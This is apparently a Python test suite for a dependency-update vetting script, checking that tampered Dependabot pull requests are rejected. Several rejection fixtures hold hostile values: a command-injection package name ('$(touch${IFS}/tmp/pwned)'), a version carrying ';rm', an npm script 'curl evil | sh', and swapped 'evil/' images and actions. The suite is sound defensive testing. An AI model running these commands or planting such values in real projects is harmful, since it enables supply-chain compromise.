"""The scripts of the weekly dependency update
(.claude/skills/dependency-updates: vet.py, renew.sh, pip_hashes.py).

vet.py runs in a clone of a local repository whose refs/pull/<n>/head hold
crafted commits, with a fake `gh` on PATH that answers from a JSON file."""
import importlib.util
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import textwrap
import unittest


ROOT = Path(__file__).resolve().parents[3]
SKILL = ROOT / '.claude/skills/dependency-updates'
SHA1 = 'a' * 40
SHA2 = 'b' * 40
H = ['1' * 64, '2' * 64, '3' * 64]

FAKE_GH = textwrap.dedent('''\
    #!/usr/bin/env python3
    import json, os, subprocess, sys
    state = json.load(open(os.environ['FAKE_GH']))
    args = sys.argv[1:]
    def out(value):
        print(json.dumps(value))
        sys.exit(0)
    if args[:2] == ['pr', 'view']:
        out(state['prs'][args[2]])
    if args[:2] == ['repo', 'view']:
        out({'nameWithOwner': 'owner/repo'})
    if args[:1] == ['api'] and '/advisories' in args:
        query = dict(a.split('=', 1) for a in args if '=' in a)
        if query['affects'] in state.get('refuse', []):
            print('gh: Validation Failed (HTTP 422)', file=sys.stderr)
            sys.exit(1)
        out(state.get('advisories', {}).get(query['ecosystem'] + '/' + query['affects'], []))
    if args[:1] == ['api'] and args[1].startswith('repos/owner/repo/commits/'):
        sha = args[1].rsplit('/', 1)[1]
        parents = subprocess.run(['git', 'rev-list', '--parents', '-n1', sha], capture_output=True,
                                 text=True, check=True).stdout.split()[1:]
        commit = {'commit': {'verification': {'verified': True, 'reason': 'valid'}},
                  'committer': {'login': 'web-flow'}, 'parents': [{'sha': p} for p in parents]}
        commit.update(state.get('commits', {}).get(sha, {}))
        out(commit)
    if args[:1] == ['api'] and args[1].startswith('repos/caddyserver/caddy/releases/tags/'):
        if state.get('caddy') is None:
            print('gh: Not Found (HTTP 404)', file=sys.stderr)
            sys.exit(1)
        print(state['caddy'])
        sys.exit(0)
    print('fake gh: unexpected ' + ' '.join(args), file=sys.stderr)
    sys.exit(2)
''')

BASE = {
    'README.md': 'Gelabber\n',
    'backend/Cargo.toml': textwrap.dedent('''\
        [workspace]
        members = []

        [workspace.dependencies]
        serde = "1.0.200"
        tokio = { version = "1.40.0", features = ["full"] }
        '''),
    'backend/Cargo.lock': textwrap.dedent(f'''\
        version = 4

        [[package]]
        name = "serde"
        version = "1.0.200"
        source = "registry+https://github.com/rust-lang/crates.io-index"
        checksum = "{H[0]}"

        [[package]]
        name = "tokio"
        version = "1.40.0"
        source = "registry+https://github.com/rust-lang/crates.io-index"
        checksum = "{H[1]}"
        '''),
    'desktop/core/Cargo.toml': textwrap.dedent('''\
        [package]
        name = "gelabber-media-core"
        version = "0.14.0"

        [dependencies]
        ndarray = "0.15.6"
        '''),
    'desktop/Cargo.lock': textwrap.dedent(f'''\
        version = 4

        [[package]]
        name = "ndarray"
        version = "0.15.6"
        source = "registry+https://github.com/rust-lang/crates.io-index"
        checksum = "{H[2]}"
        '''),
    'web/package.json': json.dumps({
        'name': 'web', 'version': '0.14.0', 'scripts': {'test': 'vitest'},
        'dependencies': {'react': '19.3.1', 'zustand': '^5.1.1'}, 'devDependencies': {'@tailwindcss/vite': '4.3.4'},
    }, indent=2) + '\n',
    'web/package-lock.json': json.dumps({
        'name': 'web', 'version': '0.14.0', 'lockfileVersion': 3, 'requires': True,
        'packages': {
            '': {'name': 'web', 'version': '0.14.0', 'dependencies': {'react': '19.3.1', 'zustand': '^5.1.1'},
                 'devDependencies': {'@tailwindcss/vite': '4.3.4'}},
            'node_modules/react': {'version': '19.3.1',
                                   'resolved': 'https://registry.npmjs.org/react/-/react-19.3.1.tgz',
                                   'integrity': 'sha512-react1'},
            'node_modules/zustand': {'version': '5.1.1',
                                     'resolved': 'https://registry.npmjs.org/zustand/-/zustand-5.1.1.tgz',
                                     'integrity': 'sha512-zustand1'},
            'node_modules/@tailwindcss/vite': {
                'version': '4.3.4', 'dev': True,
                'resolved': 'https://registry.npmjs.org/@tailwindcss/vite/-/vite-4.3.4.tgz',
                'integrity': 'sha512-vite1'},
            # As in #549: npm writes neither resolved nor integrity for a bundled package.
            'node_modules/@tailwindcss/oxide-wasm32-wasi': {
                'version': '4.3.4', 'dev': True, 'optional': True, 'bundleDependencies': ['tslib'],
                'resolved': 'https://registry.npmjs.org/@tailwindcss/oxide-wasm32-wasi/-/oxide-wasm32-wasi-4.3.4.tgz',
                'integrity': 'sha512-oxide1'},
            'node_modules/@tailwindcss/oxide-wasm32-wasi/node_modules/tslib': {
                'version': '2.8.0', 'dev': True, 'optional': True, 'inBundle': True, 'license': '0BSD'},
        }}, indent=2) + '\n',
    'web/Dockerfile': 'FROM node:26.13.0-trixie AS build\nRUN npm ci\nFROM nginx:1.31.9-alpine\n',
    # Stryker's own folder for mutation-web.yml (GEL-388).
    'web/scripts/mutation/package.json': json.dumps({
        'name': 'gelabber-web-mutation', 'private': True, 'devDependencies': {'@stryker-mutator/core': '10.1.1'},
    }, indent=2) + '\n',
    'web/scripts/mutation/package-lock.json': json.dumps({
        'name': 'gelabber-web-mutation', 'lockfileVersion': 3, 'requires': True,
        'packages': {
            '': {'name': 'gelabber-web-mutation', 'devDependencies': {'@stryker-mutator/core': '10.1.1'}},
            'node_modules/@stryker-mutator/core': {
                'version': '10.1.1', 'dev': True,
                'resolved': 'https://registry.npmjs.org/@stryker-mutator/core/-/core-10.1.1.tgz',
                'integrity': 'sha512-stryker1'},
        }}, indent=2) + '\n',
    'deploy/compose/compose.yaml': 'services:\n  caddy:\n    image: caddy:2.11.8-alpine\n',
    '.github/workflows/ci.yml': f'jobs:\n  a:\n    steps:\n      - uses: docker/login-action@{SHA1} # v4.7.0\n',
    'deploy/compose/tests/requirements.txt':
        f'PyYAML==6.0.2 \\\n    --hash=sha256:{H[0]} \\\n    --hash=sha256:{H[1]}\n',
}


def message(*updates, group='g', title='chore(deps): bump'):
    """A Dependabot commit message for (name, from, to) updates; from None
    leaves out its `Updates` line."""
    lines = [title, '']
    lines += [f'Updates `{n}` from {a} to {b}' for n, a, b in updates if a is not None]
    lines += ['', '---', 'updated-dependencies:']
    for n, _, b in updates:
        lines += [f'- dependency-name: {n}', f'  dependency-version: {b}',
                  '  dependency-type: direct:production', '  update-type: version-update:semver-patch']
        if group:
            lines.append(f'  dependency-group: {group}')
    lines += ['...', '', 'Signed-off-by: dependabot[bot] <support@github.com>', '']
    return '\n'.join(lines)


def lock_entry(name, version, integrity, tarball=None):
    short = name.split('/')[-1]
    return {'version': version, 'integrity': integrity,
            'resolved': tarball or f'https://registry.npmjs.org/{name}/-/{short}-{version}.tgz'}


def npm_lock(edit):
    lock = json.loads(BASE['web/package-lock.json'])
    edit(lock['packages'])
    return json.dumps(lock, indent=2) + '\n'


def npm_manifest(edit):
    manifest = json.loads(BASE['web/package.json'])
    edit(manifest)
    return json.dumps(manifest, indent=2) + '\n'


def vite_bump(packages):
    packages['']['devDependencies']['@tailwindcss/vite'] = '4.3.5'
    packages['node_modules/@tailwindcss/vite'] = dict(lock_entry('@tailwindcss/vite', '4.3.5', 'sha512-vite2'), dev=True)


def oxide_bump(packages):
    vite_bump(packages)
    packages['node_modules/@tailwindcss/oxide-wasm32-wasi'].update(
        version='4.3.5', integrity='sha512-oxide2',
        resolved='https://registry.npmjs.org/@tailwindcss/oxide-wasm32-wasi/-/oxide-wasm32-wasi-4.3.5.tgz')
    packages['node_modules/@tailwindcss/oxide-wasm32-wasi/node_modules/tslib']['version'] = '2.8.1'


def replace(path, old, new):
    text = BASE[path]
    assert old in text, (path, old)
    return {path: text.replace(old, new)}


SERDE_LOCK = replace('backend/Cargo.lock', f'version = "1.0.200"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "{H[0]}"',
                     f'version = "1.0.201"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "{"4" * 64}"')
SERDE = {**replace('backend/Cargo.toml', 'serde = "1.0.200"', 'serde = "1.0.201"'), **SERDE_LOCK}
NDARRAY_LOCK = BASE['desktop/Cargo.lock'] + textwrap.dedent(f'''
    [[package]]
    name = "ndarray"
    version = "0.17.2"
    source = "registry+https://github.com/rust-lang/crates.io-index"
    checksum = "{"5" * 64}"
    ''')
# #1050 as Dependabot sent it (shortened lock file).
NDARRAY_1050 = {**replace('desktop/core/Cargo.toml', 'ndarray = "0.15.6"', 'ndarray = "0.17.2"'),
                'desktop/Cargo.lock': NDARRAY_LOCK}
MESSAGE_1050 = textwrap.dedent('''\
    chore(deps): Bump ndarray from 0.15.6 to 0.17.2 in /desktop

    Bumps [ndarray](https://github.com/rust-ndarray/ndarray) from 0.15.6 to 0.17.2.
    - [Release notes](https://github.com/rust-ndarray/ndarray/releases)

    ---
    updated-dependencies:
    - dependency-name: ndarray
      dependency-version: 0.17.2
      dependency-type: direct:production
      update-type: version-update:semver-minor
    ...

    Signed-off-by: dependabot[bot] <support@github.com>
    ''')

# name: (files, updates or message, expected rejection substring or None, options)
CASES = {
    'cargo version and lock': (SERDE, [('serde', '1.0.200', '1.0.201')], None, {}),
    '#1050 ndarray': (NDARRAY_1050, MESSAGE_1050, None, {'branch': 'dependabot/cargo/desktop/ndarray-0.17.2'}),
    'cargo inline table version': (
        {**replace('backend/Cargo.toml', 'version = "1.40.0"', 'version = "1.41.0"'),
         **replace('backend/Cargo.lock', f'version = "1.40.0"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "{H[1]}"',
                   f'version = "1.41.0"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "{"6" * 64}"')},
        [('tokio', '1.40.0', '1.41.0')], None, {}),
    'transitive lock churn': (
        {**SERDE, 'backend/Cargo.lock': SERDE_LOCK['backend/Cargo.lock'] + textwrap.dedent(f'''
            [[package]]
            name = "itoa"
            version = "1.0.15"
            source = "registry+https://github.com/rust-lang/crates.io-index"
            checksum = "{"7" * 64}"
            ''')},
        [('serde', '1.0.200', '1.0.201')], None, {}),
    'npm scoped package': (
        {'web/package.json': npm_manifest(lambda m: m['devDependencies'].update({'@tailwindcss/vite': '4.3.5'})),
         'web/package-lock.json': npm_lock(vite_bump)},
        [('@tailwindcss/vite', '4.3.4', '4.3.5')], None, {'branch': 'dependabot/npm_and_yarn/web/npm-1'}),
    'npm bundled entries move (#549)': (
        {'web/package.json': npm_manifest(lambda m: m['devDependencies'].update({'@tailwindcss/vite': '4.3.5'})),
         'web/package-lock.json': npm_lock(oxide_bump)},
        [('@tailwindcss/vite', '4.3.4', '4.3.5')], None, {'branch': 'dependabot/npm_and_yarn/web/npm-2'}),
    'from read off the change': (SERDE, [('serde', None, '1.0.201')], None, {}),
    'npm range, from read off the lock': (
        {'web/package.json': npm_manifest(lambda m: m['dependencies'].update({'zustand': '^5.1.2'})),
         'web/package-lock.json': npm_lock(lambda p: (p['']['dependencies'].update(zustand='^5.1.2'),
                                                       p.update({'node_modules/zustand': lock_entry('zustand', '5.1.2', 'sha512-zustand2')})))},
        [('zustand', None, '5.1.2')], None, {'branch': 'dependabot/npm_and_yarn/web/npm-3'}),
    'npm in the Stryker folder (GEL-388)': (
        {'web/scripts/mutation/package.json': BASE['web/scripts/mutation/package.json'].replace('10.1.1', '10.1.2'),
         'web/scripts/mutation/package-lock.json': BASE['web/scripts/mutation/package-lock.json'].replace(
             '10.1.1', '10.1.2').replace('sha512-stryker1', 'sha512-stryker2')},
        [('@stryker-mutator/core', '10.1.1', '10.1.2')], None, {'branch': 'dependabot/npm_and_yarn/npm-5'}),
    'npm range only in the manifest': (
        {'web/package.json': npm_manifest(lambda m: m['dependencies'].update({'zustand': '^5.1.2'}))},
        [('zustand', None, '5.1.2')], None, {'branch': 'dependabot/npm_and_yarn/web/npm-4'}),
    'unknown from': (
        {'backend/Cargo.lock': BASE['backend/Cargo.lock'] + textwrap.dedent(f'''
            [[package]]
            name = "itoa"
            version = "1.0.15"
            source = "registry+https://github.com/rust-lang/crates.io-index"
            checksum = "{"7" * 64}"
            ''')},
        [('itoa', None, '1.0.15')], None, {}),
    'docker tag': (replace('web/Dockerfile', 'node:26.13.0-trixie', 'node:26.13.1-trixie'),
                   [('node', '26.13.0-trixie', '26.13.1-trixie')], None, {'branch': 'dependabot/docker/web/docker-1'}),
    'docker digest': (replace('web/Dockerfile', 'nginx:1.31.9-alpine', 'nginx:1.31.9-alpine@sha256:' + '8' * 64),
                      [('nginx', '1.31.9-alpine', '1.31.9-alpine')], None, {'branch': 'dependabot/docker/web/docker-1'}),
    'compose tag': (replace('deploy/compose/compose.yaml', 'caddy:2.11.8-alpine', 'caddy:2.11.9-alpine'),
                    [('caddy', '2.11.8-alpine', '2.11.9-alpine')], None, {'branch': 'dependabot/docker_compose/deploy/compose/compose-1'}),
    'action commit': (replace('.github/workflows/ci.yml', f'{SHA1} # v4.7.0', f'{SHA2} # v4.8.0'),
                      [('docker/login-action', '4.7.0', '4.8.0')], None, {'branch': 'dependabot/github_actions/actions-1'}),
    'pip version and hashes': (
        replace('deploy/compose/tests/requirements.txt', f'PyYAML==6.0.2 \\\n    --hash=sha256:{H[0]} \\\n    --hash=sha256:{H[1]}\n',
                f'PyYAML==6.0.3 \\\n    --hash=sha256:{"9" * 64} \\\n    --hash=sha256:{H[1]} \\\n    --hash=sha256:{H[2]}\n'),
        [('pyyaml', '6.0.2', '6.0.3')], None, {'branch': 'dependabot/pip/deploy/compose/tests/pip-1'}),
    # Rejected.
    'unverified commit': (SERDE, [('serde', '1.0.200', '1.0.201')], 'is not verified',
                          {'commit': {'commit': {'verification': {'verified': False, 'reason': 'unsigned'}}}}),
    'committer not web-flow': (SERDE, [('serde', '1.0.200', '1.0.201')], 'committed by someone',
                               {'commit': {'committer': {'login': 'someone'}}}),
    'second author': (SERDE, [('serde', '1.0.200', '1.0.201')], 'has authors',
                      {'authors': ['dependabot[bot]', 'someone']}),
    'from a fork': (SERDE, [('serde', '1.0.200', '1.0.201')], 'comes from a fork', {'pr': {'isCrossRepository': True}}),
    'not a dependabot branch': (SERDE, [('serde', '1.0.200', '1.0.201')], 'branch feature/x', {'branch': 'feature/x'}),
    'opened by someone else': (SERDE, [('serde', '1.0.200', '1.0.201')], 'opened by someone',
                               {'pr': {'author': {'login': 'someone'}}}),
    'closed': (SERDE, [('serde', '1.0.200', '1.0.201')], 'state CLOSED', {'pr': {'state': 'CLOSED'}}),
    'other file': ({**SERDE, 'README.md': 'changed\n'}, [('serde', '1.0.200', '1.0.201')], 'changes README.md', {}),
    'new file': ({**SERDE, 'deploy/compose/extra.yaml': 'services: {}\n'}, [('serde', '1.0.200', '1.0.201')], 'new file', {}),
    'deleted file': ({**SERDE, 'web/Dockerfile': None}, [('serde', '1.0.200', '1.0.201')], 'deleted file', {}),
    'no updated-dependencies': (SERDE, 'chore(deps): bump serde\n', 'no updated-dependencies block', {}),
    'unsafe name': (SERDE, [('$(touch${IFS}/tmp/pwned)', '1.0.200', '1.0.201')], 'unsafe', {}),
    'unsafe version': (SERDE, [('serde', '1.0.200', '1.0.201;rm')], 'unsafe', {}),
    'FROM another image': (replace('web/Dockerfile', 'node:26.13.0-trixie', 'evil/node:26.13.1-trixie'),
                           [('node', '26.13.0-trixie', '26.13.1-trixie')], 'not a version line', {}),
    'FROM stage added': (replace('web/Dockerfile', 'RUN npm ci\n', 'RUN npm ci\nFROM node:26.13.1-trixie AS extra\n'),
                         [('node', '26.13.0-trixie', '26.13.1-trixie')], 'beyond a version change', {}),
    'compose image of another repository': (replace('deploy/compose/compose.yaml', 'caddy:2.11.8-alpine', 'evil/caddy:2.11.9-alpine'),
                                            [('caddy', '2.11.8-alpine', '2.11.9-alpine')], 'not a version line', {}),
    'action of another owner': (replace('.github/workflows/ci.yml', f'docker/login-action@{SHA1}', f'evil/login-action@{SHA2}'),
                                [('docker/login-action', '4.7.0', '4.8.0')], 'not a version line', {}),
    'action pinned to a tag': (replace('.github/workflows/ci.yml', f'{SHA1} # v4.7.0', 'v4.8.0'),
                               [('docker/login-action', '4.7.0', '4.8.0')], 'not a version line', {}),
    'cargo dependency added': (replace('backend/Cargo.toml', 'serde = "1.0.200"', 'serde = "1.0.200"\nevil = "1.0.0"'),
                               [('evil', '0.0.0', '1.0.0')], 'evil added or removed', {}),
    'cargo build key': (replace('desktop/core/Cargo.toml', 'version = "0.14.0"', 'version = "0.14.0"\nbuild = "evil.rs"'),
                        [('build', '0', '1')], 'package.build added or removed', {}),
    'cargo git source': (replace('backend/Cargo.toml', 'tokio = { version = "1.40.0", features = ["full"] }',
                                 'tokio = { version = "1.41.0", features = ["full"], git = "https://example.com/tokio" }'),
                         [('tokio', '1.40.0', '1.41.0')], 'tokio.git added or removed', {}),
    'cargo package version': (replace('desktop/core/Cargo.toml', 'version = "0.14.0"', 'version = "0.14.1"'),
                              [('ndarray', '0.15.6', '0.17.2')], 'package.version changed', {}),
    'npm scripts.test': (
        {'web/package.json': npm_manifest(lambda m: m['scripts'].update({'test': 'curl evil | sh'}))},
        [('test', 'vitest', 'evil')], 'scripts changed', {}),
    'npm dependency added': (
        {'web/package.json': npm_manifest(lambda m: m['dependencies'].update({'evil': '1.0.0'}))},
        [('evil', '0.0.0', '1.0.0')], 'dependencies.evil changed', {}),
    'cargo lock git source': (
        {**SERDE, 'backend/Cargo.lock': SERDE_LOCK['backend/Cargo.lock'].replace(
            'version = "1.0.201"\nsource = "registry+https://github.com/rust-lang/crates.io-index"',
            'version = "1.0.201"\nsource = "git+https://example.com/serde#abc"')},
        [('serde', '1.0.200', '1.0.201')], 'from git+https', {}),
    'cargo lock checksum without version': (
        replace('backend/Cargo.lock', f'checksum = "{H[1]}"', f'checksum = "{"6" * 64}"'),
        [('tokio', '1.40.0', '1.40.0')], 'changed its checksum', {}),
    'npm lock tarball of another package': (
        {'web/package.json': npm_manifest(lambda m: m['devDependencies'].update({'@tailwindcss/vite': '4.3.5'})),
         'web/package-lock.json': npm_lock(lambda p: (vite_bump(p), p['node_modules/@tailwindcss/vite'].update(
             resolved='https://registry.npmjs.org/evil/-/evil-1.0.0.tgz')))},
        [('@tailwindcss/vite', '4.3.4', '4.3.5')], 'resolves to', {}),
    'npm lock integrity without version': (
        {'web/package-lock.json': npm_lock(lambda p: p['node_modules/react'].update(integrity='sha512-evil'))},
        [('react', '19.3.1', '19.3.1')], 'changed its integrity', {}),
    'npm lock git version': (
        {'web/package.json': npm_manifest(lambda m: m['dependencies'].update({'react': '19.3.2'})),
         'web/package-lock.json': npm_lock(lambda p: (p[''] ['dependencies'].update(react='19.3.2'),
                                                       p['node_modules/react'].update(version='git+https://example.com/react.git')))},
        [('react', '19.3.1', '19.3.2')], "has version 'git+https", {}),
    'npm lock resolved removed': (
        {'web/package.json': npm_manifest(lambda m: m['devDependencies'].update({'@tailwindcss/vite': '4.3.5'})),
         'web/package-lock.json': npm_lock(lambda p: (vite_bump(p), p['node_modules/@tailwindcss/vite'].pop('resolved')))},
        [('@tailwindcss/vite', '4.3.4', '4.3.5')], 'resolves to None', {}),
    'npm bundled without its parent': (
        {'web/package-lock.json': npm_lock(lambda p: p.update({'node_modules/stray/node_modules/evil': {
            'version': '1.0.0', 'inBundle': True}}))},
        [('evil', '0.0.0', '1.0.0')], 'bundled without a parent', {}),
    'fetched head is not the API head': (SERDE, [('serde', '1.0.200', '1.0.201')], "is not the pull request's head",
                                         {'pr': {'headRefOid': 'c' * 40}}),
    'pip package added': (
        replace('deploy/compose/tests/requirements.txt', 'PyYAML==6.0.2', f'evil==1.0 \\\n    --hash=sha256:{H[2]}\nPyYAML==6.0.2'),
        [('evil', '0.9', '1.0')], 'beyond a version change', {}),
}


def git(repo, *args, env=None):
    return subprocess.run(['git', '-C', str(repo), '-c', 'user.name=t', '-c', 'user.email=t@t',
                           '-c', 'commit.gpgsign=false', *args],
                          check=True, capture_output=True, text=True, env=env).stdout.strip()


class Vet(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        tmp = Path(cls.tmp.name)
        cls.origin, cls.work, cls.bin = tmp / 'origin.git', tmp / 'work', tmp / 'bin'
        git(tmp, 'init', '-q', '--bare', str(cls.origin))
        git(tmp, 'init', '-q', str(cls.work))
        for path, text in BASE.items():
            (cls.work / path).parent.mkdir(parents=True, exist_ok=True)
            (cls.work / path).write_text(text)
        git(cls.work, 'add', '-A')
        git(cls.work, 'commit', '-q', '-m', 'base')
        cls.base = git(cls.work, 'rev-parse', 'HEAD')
        git(cls.work, 'remote', 'add', 'origin', str(cls.origin))
        git(cls.work, 'push', '-q', 'origin', 'HEAD:refs/heads/main')
        cls.bin.mkdir()
        (cls.bin / 'gh').write_text(FAKE_GH)
        (cls.bin / 'gh').chmod(0o755)
        cls.state = {'prs': {}, 'commits': {}, 'advisories': {}}
        cls.numbers = {}
        for number, (name, (files, updates, _, options)) in enumerate(CASES.items(), start=1):
            cls.numbers[name] = number
            cls.add_pr(number, files, updates, options)
        cls.add_pr_475()

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    @classmethod
    def commit(cls, files, msg, author='dependabot[bot]', parent=None):
        git(cls.work, 'checkout', '-q', '--detach', parent or cls.base)
        for path, text in files.items():
            target = cls.work / path
            if text is None:
                target.unlink()
            else:
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text(text)
        git(cls.work, 'add', '-A')
        git(cls.work, '-c', f'user.name={author}', 'commit', '-q', '-m', msg)
        return git(cls.work, 'rev-parse', 'HEAD')

    @classmethod
    def add_pr(cls, number, files, updates, options):
        msg = updates if isinstance(updates, str) else message(*updates)
        title, _, rest = msg.partition('\n')
        sha = cls.commit(files, f'{title} (case {number})\n{rest}')
        git(cls.work, 'push', '-q', '-f', 'origin', f'{sha}:refs/pull/{number}/head')
        pr = {'number': number, 'author': {'login': 'app/dependabot'}, 'isCrossRepository': False,
              'headRefName': options.get('branch', 'dependabot/cargo/backend/cargo-1'),
              'headRefOid': sha, 'state': 'OPEN',
              'commits': [{'oid': sha, 'authors': [{'login': a} for a in options.get('authors', ['dependabot[bot]'])]}]}
        pr.update(options.get('pr', {}))
        cls.state['prs'][str(number)] = pr
        if 'commit' in options:
            cls.state['commits'][sha] = options['commit']

    @classmethod
    def add_pr_475(cls):
        """#475: Dependabot's commit, a maintainer's commit on top and a merge of main."""
        bot = cls.commit(SERDE, message(('serde', '1.0.200', '1.0.201')))
        notices = cls.commit({'README.md': 'notices\n'}, 'desktop: third-party notices', author='rafiistcool', parent=bot)
        git(cls.work, 'checkout', '-q', '--detach', cls.base)
        main = cls.commit({'web/Dockerfile': BASE['web/Dockerfile'] + '# main\n'}, 'main moved', author='rafiistcool')
        git(cls.work, 'checkout', '-q', '--detach', notices)
        git(cls.work, 'merge', '-q', '--no-ff', '-m', 'Merge main', main)
        merge = git(cls.work, 'rev-parse', 'HEAD')
        git(cls.work, 'push', '-q', '-f', 'origin', f'{merge}:refs/pull/475/head')
        cls.state['prs']['475'] = {
            'number': 475, 'author': {'login': 'app/dependabot'}, 'isCrossRepository': False,
            'headRefName': 'dependabot/cargo/backend/cargo-9673306035', 'headRefOid': merge, 'state': 'OPEN',
            'commits': [{'oid': bot, 'authors': [{'login': 'dependabot[bot]'}]},
                        {'oid': notices, 'authors': [{'login': 'rafiistcool'}, {'login': 'claude'}]},
                        {'oid': merge, 'authors': [{'login': 'rafiistcool'}]}]}
        for sha in (notices, merge):
            cls.state['commits'][sha] = {'commit': {'verification': {'verified': False, 'reason': 'unsigned'}},
                                         'committer': {'login': 'rafiistcool'}}

    def vet(self, *numbers, advisories=None, refuse=()):
        state = dict(self.state, advisories=advisories or {}, refuse=list(refuse))
        with tempfile.TemporaryDirectory() as tmp:
            state_file = Path(tmp) / 'state.json'
            state_file.write_text(json.dumps(state))
            env = dict(os.environ, PATH=f'{self.bin}{os.pathsep}{os.environ["PATH"]}', FAKE_GH=str(state_file))
            result = subprocess.run([sys.executable, '-I', str(SKILL / 'vet.py'), *map(str, numbers)],
                                    cwd=self.work, env=env, capture_output=True, text=True)
        self.assertNotIn('Traceback', result.stderr)
        return result.returncode, [json.loads(line) for line in result.stdout.splitlines()], result.stderr

    def test_each_case(self):
        for name, (_, _, rejection, _) in CASES.items():
            with self.subTest(name):
                code, out, err = self.vet(self.numbers[name])
                if rejection is None:
                    self.assertEqual((code, err), (0, ''))
                    self.assertTrue(out[0]['updates'])
                else:
                    self.assertEqual(code, 1)
                    self.assertIn(rejection, err)

    def test_the_1050_shape_reads_its_update_from_the_commit(self):
        _, out, _ = self.vet(self.numbers['#1050 ndarray'])
        self.assertEqual([(u['name'], u['from'], u['to']) for u in out[0]['updates']], [('ndarray', '0.15.6', '0.17.2')])
        self.assertEqual(out[0]['ecosystem'], 'cargo')
        # Ungrouped is not security: only an advisory for the from version is.
        self.assertIs(out[0]['security'], False)
        self.assertEqual(out[0]['updates'][0]['security'], [])

    def test_from_comes_from_the_change_when_the_message_lacks_it(self):
        _, out, _ = self.vet(self.numbers['from read off the change'],
                             advisories={'rust/serde@1.0.200': [{'ghsa_id': 'GHSA-yyyy'}]})
        self.assertEqual(out[0]['updates'][0]['from'], '1.0.200')
        self.assertIs(out[0]['security'], True)

    def test_an_npm_from_comes_from_the_lock_not_the_range(self):
        _, out, _ = self.vet(self.numbers['npm range, from read off the lock'])
        self.assertEqual(out[0]['updates'][0]['from'], '5.1.1')
        self.assertEqual(out[0]['updates'][0]['security'], [])

    def test_a_range_without_a_lock_version_is_unknown(self):
        code, out, err = self.vet(self.numbers['npm range only in the manifest'])
        self.assertEqual((code, err), (0, ''))
        self.assertIsNone(out[0]['updates'][0]['from'])
        self.assertEqual(out[0]['security'], 'unknown')

    def test_a_refused_advisory_query_is_unknown(self):
        code, out, err = self.vet(self.numbers['cargo version and lock'], refuse=['serde@1.0.200'])
        self.assertEqual((code, err), (0, ''))
        self.assertIsNone(out[0]['updates'][0]['security'])
        self.assertEqual(out[0]['security'], 'unknown')

    def test_an_unknown_from_is_unknown_not_safe(self):
        code, out, err = self.vet(self.numbers['unknown from'])
        self.assertEqual((code, err), (0, ''))
        self.assertIsNone(out[0]['updates'][0]['security'])
        self.assertEqual(out[0]['security'], 'unknown')

    def test_the_475_shape_is_rejected_for_each_foreign_commit(self):
        code, _, err = self.vet(475)
        self.assertEqual(code, 1)
        for reason in ("has authors ['rafiistcool', 'claude']", 'is not verified (unsigned)',
                       'committed by rafiistcool', 'has 2 parents'):
            self.assertIn(reason, err)

    def test_one_rejected_pull_request_fails_the_run(self):
        code, out, _ = self.vet(self.numbers['cargo version and lock'], self.numbers['other file'])
        self.assertEqual(code, 1)
        self.assertEqual(len(out), 2)

    def test_security_follows_the_advisory_database(self):
        number = self.numbers['cargo version and lock']
        _, out, _ = self.vet(number)
        self.assertFalse(out[0]['security'])
        _, out, _ = self.vet(number, advisories={'rust/serde@1.0.200': [{'ghsa_id': 'GHSA-xxxx'}]})
        self.assertTrue(out[0]['security'])
        self.assertEqual(out[0]['updates'][0]['security'], ['GHSA-xxxx'])

    def test_no_temporary_ref_is_left(self):
        self.vet(self.numbers['cargo version and lock'])
        self.assertEqual(git(self.work, 'for-each-ref', 'refs/dependabot-vet-*'), '')


class Renew(unittest.TestCase):
    CI = ('    steps:\n      - name: Install Caddy\n        env:\n          CADDY_VERSION: 2.11.8\n'
          f'          CADDY_SHA256: {H[0]}\n      - uses: actions/setup-node@x\n        with:\n'
          '          node-version: 26.13.0\n')

    def renew(self, part, compose='    image: caddy:2.11.9-alpine\n', caddy=None, dockerfile='FROM node:26.13.1-trixie AS build\n'):
        with tempfile.TemporaryDirectory() as tmp:
            repo, bin_dir = Path(tmp) / 'repo', Path(tmp) / 'bin'
            for path, text in {'deploy/compose/compose.yaml': compose, '.github/workflows/ci.yml': self.CI,
                               '.github/workflows/e2e-extended.yml': '          node-version: 26.13.0\n',
                               'web/Dockerfile': dockerfile}.items():
                (repo / path).parent.mkdir(parents=True, exist_ok=True)
                (repo / path).write_text(text)
            bin_dir.mkdir()
            (bin_dir / 'gh').write_text(FAKE_GH)
            (bin_dir / 'gh').chmod(0o755)
            state = Path(tmp) / 'state.json'
            state.write_text(json.dumps({'caddy': caddy}))
            env = dict(os.environ, PATH=f'{bin_dir}{os.pathsep}{os.environ["PATH"]}', FAKE_GH=str(state))
            result = subprocess.run(['sh', str(SKILL / 'renew.sh'), part], cwd=repo, env=env, capture_output=True, text=True)
            return result.returncode, (repo / '.github/workflows/ci.yml').read_text(), result.stderr

    def test_caddy_takes_version_and_digest(self):
        code, ci, _ = self.renew('caddy', caddy=f'sha256:{H[2]}')
        self.assertEqual(code, 0)
        self.assertIn('CADDY_VERSION: 2.11.9\n', ci)
        self.assertIn(f'CADDY_SHA256: {H[2]}\n', ci)

    def test_caddy_already_current_asks_nothing(self):
        code, ci, _ = self.renew('caddy', compose='    image: caddy:2.11.8-alpine\n', caddy=None)
        self.assertEqual((code, ci), (0, self.CI))

    def test_caddy_stops_on_a_missing_or_malformed_digest(self):
        for digest in (None, '', f'sha512:{H[2]}', 'sha256:abc', f'sha256:{H[2]}\nsha256:{H[1]}'):
            with self.subTest(digest=digest):
                code, ci, _ = self.renew('caddy', caddy=digest)
                self.assertNotEqual(code, 0)
                self.assertEqual(ci, self.CI)

    def test_caddy_stops_without_a_pin(self):
        code, ci, err = self.renew('caddy', compose='    image: caddy:latest\n', caddy=f'sha256:{H[2]}')
        self.assertNotEqual(code, 0)
        self.assertIn('no Caddy pin', err)
        self.assertEqual(ci, self.CI)

    def test_node_follows_the_web_image_and_stops_without_one(self):
        code, ci, _ = self.renew('node')
        self.assertEqual(code, 0)
        self.assertIn('node-version: 26.13.1\n', ci)
        code, ci, err = self.renew('node', dockerfile='FROM node:latest\n')
        self.assertNotEqual(code, 0)
